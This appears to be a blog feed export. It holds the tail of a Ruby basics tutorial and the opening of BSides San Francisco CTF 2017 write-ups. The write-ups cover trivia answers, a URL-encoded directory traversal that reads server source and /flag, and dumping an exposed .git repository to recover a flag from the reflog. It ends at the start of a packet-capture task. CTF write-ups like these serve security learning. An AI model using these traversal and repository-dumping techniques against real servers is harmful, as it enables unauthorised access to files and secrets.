<h3 id="ranges">Ranges</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">irb(main):043:0&gt;</span> (<span class="number">41</span>..<span class="number">43</span>).to_a</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>]</div><div class="line"><span class="meta">irb(main):044:0&gt;</span> (<span class="number">41</span>...<span class="number">43</span>).to_a</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">42</span>]</div><div class="line"><span class="meta">irb(main):045:0&gt;</span> (<span class="string">'m'</span>..<span class="string">'o'</span>).to_a</div><div class="line">=&gt; [<span class="string">"m"</span>, <span class="string">"n"</span>, <span class="string">"o"</span>]</div><div class="line"><span class="meta">irb(main):046:0&gt;</span> (<span class="string">'y'</span>..<span class="string">'b'</span>).to_a</div><div class="line">=&gt; []</div></pre></td></tr></table></figure></p>
<h3 id="for-loop">for loop</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="break">break</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  <span class="keyword">break</span> <span class="keyword">if</span> i &gt; <span class="number">5</span></div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="next">next</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">1</span>..<span class="number">10</span>)</div><div class="line">  <span class="keyword">next</span> <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span></div><div class="line">  puts <span class="string">"i: <span class="subst">#&#123;i&#125;</span>"</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h3 id="loop-do">loop do</h3>
<p>Like a <code>do while</code> in others languages.</p>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a = <span class="number">0</span></div><div class="line">loop <span class="keyword">do</span></div><div class="line">  puts a</div><div class="line">  a += <span class="number">1</span></div><div class="line">  <span class="keyword">break</span> <span class="keyword">if</span> a &gt; <span class="number">10</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
<h2 id="collections">Collections</h2>
<h3 id="arrays">Arrays</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Basics</span></div><div class="line"><span class="meta">irb(main):047:0&gt;</span> peoples = [<span class="string">"Alice"</span>, <span class="string">"Bob"</span>, <span class="string">"Eve"</span>]</div><div class="line">=&gt; [<span class="string">"Alice"</span>, <span class="string">"Bob"</span>, <span class="string">"Eve"</span>]</div><div class="line"><span class="meta">irb(main):048:0&gt;</span> peoples[<span class="number">0</span>]</div><div class="line">=&gt; <span class="string">"Alice"</span></div><div class="line"><span class="meta">irb(main):049:0&gt;</span> peoples[<span class="number">1</span>]</div><div class="line">=&gt; <span class="string">"Bob"</span></div><div class="line"><span class="meta">irb(main):050:0&gt;</span> peoples[-<span class="number">1</span>]</div><div class="line">=&gt; <span class="string">"Eve"</span></div><div class="line"><span class="comment"># Adding elements</span></div><div class="line"><span class="meta">irb(main):051:0&gt;</span> foo = [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true]</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true]</div><div class="line"><span class="meta">irb(main):052:0&gt;</span> foo &lt;&lt; <span class="string">'d'</span></div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="meta">irb(main):053:0&gt;</span> foo.push(<span class="number">1337</span>)</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>, <span class="number">1337</span>]</div><div class="line"><span class="meta">irb(main):055:0&gt;</span> foo.insert(<span class="number">2</span>, <span class="number">0</span>.<span class="number">05</span>)</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">05</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>, <span class="number">1337</span>]</div><div class="line"><span class="meta">irb(main):056:0&gt;</span> foo.pop</div><div class="line">=&gt; <span class="number">1337</span></div><div class="line"><span class="meta">irb(main):057:0&gt;</span> foo</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">05</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="meta">irb(main):060:0&gt;</span> foo.delete_at(<span class="number">2</span>)</div><div class="line">=&gt; <span class="number">0</span>.<span class="number">05</span></div><div class="line"><span class="meta">irb(main):061:0&gt;</span> foo</div><div class="line">=&gt; [<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, true, <span class="string">"d"</span>]</div><div class="line"><span class="comment"># Removing elements</span></div><div class="line">irb(main)<span class="symbol">:</span><span class="number">065</span><span class="symbol">:</span><span class="number">0</span>* puts foo</div><div class="line"><span class="number">42</span></div><div class="line">Cindy</div><div class="line"><span class="number">0</span>.<span class="number">02</span></div><div class="line"><span class="literal">true</span></div><div class="line">d</div><div class="line">=&gt; nil</div><div class="line"><span class="meta">irb(main):066:0&gt;</span> print foo</div><div class="line">[<span class="number">42</span>, <span class="string">"Cindy"</span>, <span class="number">0</span>.<span class="number">02</span>, <span class="literal">true</span>, <span class="string">"d"</span>]=&gt; <span class="literal">nil</span></div><div class="line"><span class="comment"># Array Ranges</span></div><div class="line">irb(main)<span class="symbol">:</span><span class="number">06</span>8<span class="symbol">:</span><span class="number">0</span>* alph = [<span class="string">'a'</span>, <span class="string">'c'</span>, <span class="string">'z'</span>, <span class="string">'e'</span>]</div><div class="line">=&gt; [<span class="string">"a"</span>, <span class="string">"c"</span>, <span class="string">"z"</span>, <span class="string">"e"</span>]</div><div class="line"><span class="meta">irb(main):069:0&gt;</span> alph[<span class="number">1</span>..<span class="number">3</span>]</div><div class="line">=&gt; [<span class="string">"c"</span>, <span class="string">"z"</span>, <span class="string">"e"</span>]</div></pre></td></tr></table></figure></p>
<h3 id="array-manipulations">Array manipulations</h3>
<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># Combining arrays</span></div><div class="line"><span class="meta">irb(main):072:0&gt;</span> x = [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):073:0&gt;</span> y = [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line"><span class="meta">irb(main):074:0&gt;</span> res = x + y</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>, <span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>]</div><div class="line"><span class="meta">irb(main):075:0&gt;</span> res = y + x</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">16</span>, <span class="number">133</span>, <span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):078:0&gt;</span> z = [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line">=&gt; [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line"><span class="meta">irb(main):079:0&gt;</span> res - z</div><div class="line">=&gt; [<span class="number">72</span>, <span class="number">133</span>, <span class="number">53</span>]</div><div class="line"><span class="comment"># Boolean operations</span></div><div class="line"><span class="meta">irb(main):081:0&gt;</span> x</div><div class="line">=&gt; [<span class="number">41</span>, <span class="number">53</span>]</div><div class="line"><span class="meta">irb(main):082:0&gt;</span> z</div><div class="line">=&gt; [<span class="number">16</span>, <span class="number">41</span>, <span class="number">55</span>]</div><div class="line"><span class="meta">irb(main):083:0&gt;</span> x &amp; z</div><div class="line">=&gt; [<span class="number">41</span>]</div><div class="line"><span class="meta">irb(main):085:0&gt;</span> x <span class="params">| z</span></div><div class="line">=&gt; [41, 53, 16, 55]</div><div class="line"># Moving elements</div><div class="line">irb(main):086:0&gt; z.reverse</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):087:0&gt; z</div><div class="line">=&gt; [16, 41, 55]</div><div class="line">irb(main):088:0&gt; z.reverse!</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):089:0&gt; z</div><div class="line">=&gt; [55, 41, 16]</div><div class="line"># Array methods</div><div class="line">irb(main):090:0&gt; z.length</div><div class="line">=&gt; 3</div><div class="line">irb(main):091:0&gt; z.size</div><div class="line">=&gt; 3</div><div class="line">irb(main):092:0&gt; z.sort</div><div class="line">=&gt; [16, 41, 55]</div><div class="line">irb(main):093:0&gt; c = [42, 42, 75, 42]</div><div class="line">=&gt; [42, 42, 75, 42]</div><div class="line">irb(main):094:0&gt; c.uniq</div><div class="line">=&gt; [42, 75]</div><div class="line">irb(main):095:0&gt; z.freeze # prevent from being modified, there is no unfreeze method</div><div class="line">=&gt; [55, 41, 16]</div><div class="line">irb(main):096:0&gt; z.pop</div><div class="line">RuntimeError: can't modify frozen Array</div><div class="line">	from (irb):96:<span class="keyword">in</span> 'pop'</div><div class="line">	from (irb):96</div><div class="line">	from /usr/bin/irb:11:<span class="keyword">in</span> `&lt;main&gt;'</div><div class="line">irb(main):102:0&gt; z.frozen?</div><div class="line">=&gt; <span class="literal">true</span></div><div class="line">irb(main):103:0&gt; z.<span class="keyword">include</span>?(55)</div><div class="line">=&gt; <span class="literal">true</span></div><div class="line">irb(main):104:0&gt; z.<span class="keyword">include</span>?(56)</div><div class="line">=&gt; <span class="literal">false</span></div><div class="line">irb(main):105:0&gt; z.min</div><div class="line">=&gt; 16</div><div class="line">irb(main):106:0&gt; z.max</div><div class="line">=&gt; 55</div></pre></td></tr></table></figure></p>
<h3 id="hashes-and-symbols">Hashes and symbols</h3>
<p><code>||</code></p>
<table>
<thead>
<tr>
<th>a</th>
<th>b</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>||</code></td>
<td><code>pipe pipe</code></td>
</tr>
<tr>
<td>|</td>
<td><code>pipe</code></td>
</tr>
</tbody>
</table>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Take it &lt;s&gt;easy&lt;/s&gt; Ruby!&lt;/p&gt;
&lt;h2 id=&quot;basic-concepts&quot;&gt;Basic concepts&lt;/h2&gt;
&lt;h3 id=&quot;hello-world&quot;&gt;Hello World&lt;/h3&gt;
&lt;p&gt;&lt;figure class=&quot;highlig
    
    </summary>
    
      <category term="programming" scheme="https://rawsec.ml/categories/programming/"/>
    
      <category term="ruby" scheme="https://rawsec.ml/categories/programming/ruby/"/>
    
    
      <category term="linux" scheme="https://rawsec.ml/tags/linux/"/>
    
      <category term="programming" scheme="https://rawsec.ml/tags/programming/"/>
    
      <category term="ruby" scheme="https://rawsec.ml/tags/ruby/"/>
    
  </entry>
  
  <entry>
    <title>BSides San Francisco CTF 2017 - Write-ups</title>
    <link href="https://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/"/>
    <id>https://rawsec.ml/en/BSides-San-Francisco-CTF-2017-write-ups/</id>
    <published>2017-02-12T23:00:00.000Z</published>
    <updated>2017-02-09T19:45:29.293Z</updated>
    
    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
<h3 id="version">Version</h3>
<table>
<thead>
<tr>
<th>By</th>
<th>Version</th>
<th>Comment</th>
</tr>
</thead>
<tbody>
<tr>
<td>noraj</td>
<td>1.0</td>
<td>Creation</td>
</tr>
</tbody>
</table>
<h3 id="ctf">CTF</h3>
<ul>
<li><strong>Name</strong> : BSides San Francisco CTF 2017</li>
<li><strong>Website</strong> : <a href="https://scoreboard.ctf.bsidessf.com/" target="_blank" rel="external">ctf.bsidessf.com</a></li>
<li><strong>Type</strong> : Online</li>
<li><strong>Format</strong> : Jeopardy</li>
<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/414" target="_blank" rel="external">link</a></li>
</ul>
<h2 id="1-hackers-misc">1 - Hackers - Misc</h2>
<blockquote>
<p>Hack the __!</p>
</blockquote>
<p>Answer: <code>planet</code></p>
<h2 id="20-nop-misc">20 - NOP - Misc</h2>
<blockquote>
<p>x86's NOP is actually another instruction. What is the Intel syntax representation of the assembly of the other instruction?</p>
<p>Include a space between operands, if applicable.</p>
</blockquote>
<p>Answer: <code>xchg eax, eax</code></p>
<p><a href="https://en.wikipedia.org/wiki/NOP" target="_blank" rel="external">Details</a></p>
<h1 id="1-ancient-hop-grain-juice-misc">1 - Ancient Hop Grain Juice - Misc</h1>
<blockquote>
<p>This beverage, brewed since ancient times, is made from hops and grains?</p>
</blockquote>
<p>Answer: <code>beer</code></p>
<h1 id="1-the-wrong-cipher-misc">1 - The Wrong Cipher - Misc</h1>
<blockquote>
<p>This cipher was used incorrectly in WEP</p>
</blockquote>
<p>Answer: <code>RC4</code></p>
<p><a href="https://en.wikipedia.org/wiki/Wired_Equivalent_Privacy" target="_blank" rel="external">Details</a></p>
<h1 id="1-the-right-cipher-misc">1 - The Right Cipher - Misc</h1>
<blockquote>
<p>This cipher was correctly used in TKIP</p>
</blockquote>
<p>Answer: <code>RC4</code></p>
<p><a href="https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol" target="_blank" rel="external">Details</a></p>
<h1 id="1-let-s-play-a-game-misc">1 - Let's play a game - Misc</h1>
<blockquote>
<p>This is the name of the game that a young hacker thinks he's playing with the WOPR Supercomputer. [Spaces expected]</p>
</blockquote>
<p>Answer: <code>Global Thermonuclear War</code></p>
<p><a href="https://en.wikipedia.org/wiki/WarGames" target="_blank" rel="external">Details</a></p>
<h1 id="1-quote-misc">1 - Quote - Misc</h1>
<blockquote>
<p>This movie featured the memorable phrase &quot;My voice is my passport&quot;</p>
</blockquote>
<p>Answer: <code>Sneakers</code></p>
<p><a href="http://www.imdb.com/title/tt0105435/quotes" target="_blank" rel="external">Movie</a></p>
<h1 id="20-zumbo-1-web">20 - Zumbo 1 - Web</h1>
<blockquote>
<p>Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.</p>
<p>Three flags await. Can you find them?</p>
<p><a href="http://zumbo-8ac445b1.ctf.bsidessf.net" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net</a></p>
<p>Stages 2 and 3 - coming soon!</p>
</blockquote>
<p>View source of <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/index.template" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/index.template</a></p>
<p><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!-- page: index.template, src: /code/server.py --&gt;</span></div></pre></td></tr></table></figure></p>
<p>Let's check the <code>/code/server.py</code> path: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/code/server.py</a>. We get an error:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">[Errno 2] No such file or directory: u&apos;code/server.py&apos;</div><div class="line">&lt;!-- page: code/server.py, src: /code/server.py --&gt;</div></pre></td></tr></table></figure></p>
<p>Every non-existing page give the same error. We need to do a directory traversal: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/../../../../code/server.py</a>. But unfortunately the <code>../../../../</code> part is automatically removed.</p>
<p>So I just URLencoded this part to bypass the filter: <a href="http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net/..%2F..%2F..%2F..%2Fcode/server.py</a>.</p>
<p>And we get the <code>server.py</code> source:</p>
<p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">import flask, sys, os</div><div class="line">import requests</div><div class="line"></div><div class="line">app = flask.Flask(__name__)</div><div class="line">counter = 12345672</div><div class="line"></div><div class="line"></div><div class="line">@app.route('/&lt;path:page&gt;')</div><div class="line">def custom_page(page):</div><div class="line">    if page == 'favicon.ico': return ''</div><div class="line">    global counter</div><div class="line">    counter += 1</div><div class="line">    try:</div><div class="line">        template = open(page).read()</div><div class="line">    except Exception as e:</div><div class="line">        template = str(e)</div><div class="line">    template += "\n&lt;!-- page: %s, src: %s --&gt;\n" % (page, __file__)</div><div class="line">    return flask.render_template_string(template, name='test', counter=counter);</div><div class="line"></div><div class="line">@app.route('/')</div><div class="line">def home():</div><div class="line">    return flask.redirect('/index.template');</div><div class="line"></div><div class="line">if __name__ == '__main__':</div><div class="line">    flag1 = 'FLAG: FIRST_FLAG_WASNT_HARD'</div><div class="line">    with open('/flag') as f:</div><div class="line">            flag2 = f.read()</div><div class="line">    flag3 = requests.get('http://vault:8080/flag').text</div><div class="line"></div><div class="line">    print "Ready set go!"</div><div class="line">    sys.stdout.flush()</div><div class="line">    app.run(host="0.0.0.0")</div><div class="line"></div><div class="line">&lt;!-- page: ../../../../code/server.py, src: /code/server.py --&gt;</div></pre></td></tr></table></figure></p>
<p>Flag was <code>FLAG: FIRST_FLAG_WASNT_HARD</code>.</p>
<p><strong>PS</strong>: Only <code>page</code> is used so <code>http://zumbo-8ac445b1.ctf.bsidessf.net/server.py</code> also works...</p>
<h1 id="100-zumbo-2-web">100 - Zumbo 2 - Web</h1>
<blockquote>
<p>Welcome to ZUMBOCOM....you can do anything at ZUMBOCOM.</p>
<p>Three flags await. Can you find them?</p>
<p><a href="http://zumbo-8ac445b1.ctf.bsidessf.net" target="_blank" rel="external">http://zumbo-8ac445b1.ctf.bsidessf.net</a></p>
<p>Stage 3 - coming soon!</p>
</blockquote>
<p>For the next part of the challenge, we already got the <code>server.py</code> source so I looked again at the flag2 part:</p>
<p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">with</span> open(<span class="string">'/flag'</span>) <span class="keyword">as</span> f:</div><div class="line">        flag2 = f.read()</div></pre></td></tr></table></figure></p>
<p>Ok the flag is in <code>/flag</code> so just change <code>http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fcode/server.py</code> into <code>http://zumbo-8ac445b1.ctf.bsidessf.net/..%2f..%2f..%2f..%2fflag</code>.</p>
<p>And get the flag: <code>FLAG: RUNNER_ON_SECOND_BASE</code>.</p>
<h1 id="100-the-year-2000-web">100 - the-year-2000 - Web</h1>
<blockquote>
<p>Wait, what year is it?</p>
<p><a href="http://theyear2000.ctf.bsidessf.net/" target="_blank" rel="external">http://theyear2000.ctf.bsidessf.net/</a></p>
</blockquote>
<p>The author says on this home page:</p>
<blockquote>
<p>I made this website all by myself using these tools</p>
<ul>
<li>html</li>
<li>notepad++</li>
<li>git</li>
<li>apache</li>
</ul>
</blockquote>
<p>I tried <code>http://theyear2000.ctf.bsidessf.net/.git/</code> and it returned me <em>Forbidden</em> error. So there is a <code>.git</code> repot here.</p>
<p>As usual I used <a href="https://github.com/internetwache/GitTools" target="_blank" rel="external">GitTools</a> to dump the repository:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">$ ./gitdumper.sh http://theyear2000.ctf.bsidessf.net/.git/ repo</div><div class="line">Destination folder does not exist</div><div class="line">Creating repo/.git/</div><div class="line">Downloaded: HEAD</div><div class="line">Downloaded: objects/info/packs</div><div class="line">Downloaded: description</div><div class="line">Downloaded: config</div><div class="line">Downloaded: COMMIT_EDITMSG</div><div class="line">Downloaded: index</div><div class="line">Downloaded: packed-refs</div><div class="line">Downloaded: refs/heads/master</div><div class="line">Downloaded: refs/remotes/origin/HEAD</div><div class="line">Downloaded: refs/stash</div><div class="line">Downloaded: logs/HEAD</div><div class="line">Downloaded: logs/refs/heads/master</div><div class="line">Downloaded: logs/refs/remotes/origin/HEAD</div><div class="line">Downloaded: info/refs</div><div class="line">Downloaded: info/exclude</div><div class="line">Downloaded: objects/4e/ec6b9c6e464c35fff1efb8444dd0ac1ae67b30</div><div class="line">Downloaded: objects/00/00000000000000000000000000000000000000</div><div class="line">Downloaded: objects/e0/39a6684f53e818926d3f62efd25217b25fc97e</div><div class="line">Downloaded: objects/9e/9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0</div><div class="line">Downloaded: objects/f3/a3f88425975542bb0058651867f8090fed250f</div><div class="line">Downloaded: objects/0c/e1cbf654058dd4b9ba0df440a02aef408f76da</div><div class="line">Downloaded: objects/bd/72ee2c7c5adb017076fd47a92858cef2a04c11</div><div class="line">Downloaded: objects/e1/6b652d659d50fc5e7aecae789e743c0a8fa035</div><div class="line">Downloaded: objects/7c/57d178eea98e174f3d6ef521126117478085ed</div><div class="line">Downloaded: objects/7b/aff32394e517c44f35b75079a9496559c88053</div></pre></td></tr></table></figure></p>
<p>A quick <code>git log -p</code> show me this commit:</p>
<p><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">commit 4eec6b9c6e464c35fff1efb8444dd0ac1ae67b30</div><div class="line">Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;</div><div class="line">Date:   Sat Feb 11 22:54:32 2017 +0000</div><div class="line"></div><div class="line">    Wooops, didn't want to commit that. Rebased.</div><div class="line"></div><div class="line">diff --git a/index.html b/index.html</div><div class="line">index 7c57d17..e16b652 100644</div><div class="line"><span class="comment">--- a/index.html</span></div><div class="line"><span class="comment">+++ b/index.html</span></div><div class="line">@@ -15,7 +15,7 @@ pre &#123;</div><div class="line"> &lt;/style&gt;</div><div class="line"> &lt;/head&gt;</div><div class="line"> &lt;body&gt;</div><div class="line"><span class="deletion">-&lt;h1&gt;Welcome to my homepage!!!!&lt;/h1&gt;</span></div><div class="line"><span class="addition">+&lt;h1&gt;Welcome to my homepage, there are no flags here.!!!!&lt;/h1&gt;</span></div><div class="line"> &lt;hr&gt;</div><div class="line"> &lt;p&gt;I made this website all by myself using these tools</div><div class="line"> &lt;ul&gt;</div></pre></td></tr></table></figure></p>
<p>There was a rebase so let's see when it happened:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$ git reflog</div><div class="line">4eec6b9 HEAD@&#123;0&#125;: commit: Wooops, didn&apos;t want to commit that. Rebased.</div><div class="line">e039a66 HEAD@&#123;1&#125;: reset: moving to HEAD~1</div><div class="line">9e9ce4d HEAD@&#123;2&#125;: commit: Fixed a spelling error</div><div class="line">e039a66 HEAD@&#123;3&#125;: commit (initial): First commit on my website</div></pre></td></tr></table></figure></p>
<p>Ok so we have to come back before the HEAD reset:</p>
<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ git reset --hard HEAD@&#123;2&#125;</div><div class="line">HEAD is now at 9e9ce4d Fixed a spelling error</div></pre></td></tr></table></figure></p>
<p>Now let's take a look at this fix: <code>git log -p -1</code></p>
<p><figure class="highlight diff"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">commit 9e9ce4da43d0d2dc10ece64f75ec9cab1f4e5de0</div><div class="line">Author: Mark Zuckerberg &lt;thezuck@therealzuck.zuck&gt;</div><div class="line">Date:   Sat Feb 11 22:54:27 2017 +0000</div><div class="line"></div><div class="line">    Fixed a spelling error</div><div class="line"></div><div class="line">diff --git a/index.html b/index.html</div><div class="line">index 7c57d17..7baff32 100644</div><div class="line"><span class="comment">--- a/index.html</span></div><div class="line"><span class="comment">+++ b/index.html</span></div><div class="line">@@ -43,3 +43,4 @@ ______________________</div><div class="line"> &lt;/pre&gt;</div><div class="line"> &lt;/marquee&gt;</div><div class="line"> &lt;/body&gt;&lt;/html&gt;</div><div class="line"><span class="addition">+Your flag is... FLAG:what_is_HEAD_may_never_die</span></div></pre></td></tr></table></figure></p>
<p>Here is teh flag: <code>FLAG:what_is_HEAD_may_never_die</code>.</p>
<h1 id="40-easycap-forensics">40 - easycap - Forensics</h1>
<blockquote>
<p>Can you get the flag from the packet capture?</p>
<ul>
<li><a href="https://scoreboard.ctf.bsidessf.com/attachment/5e1cb4ad2dd6aef750654f5377d9e67ed2732b97fe64d56e0603242c4b87d921" target="_blank" rel="external">easycap.pcap</a></li>
</ul>
</blockquote>
<p>This is some raw tcp frames and some of them have 1 byte of additional data.</p>
<p>Let's extract that with <em>tshark</em>:</p>
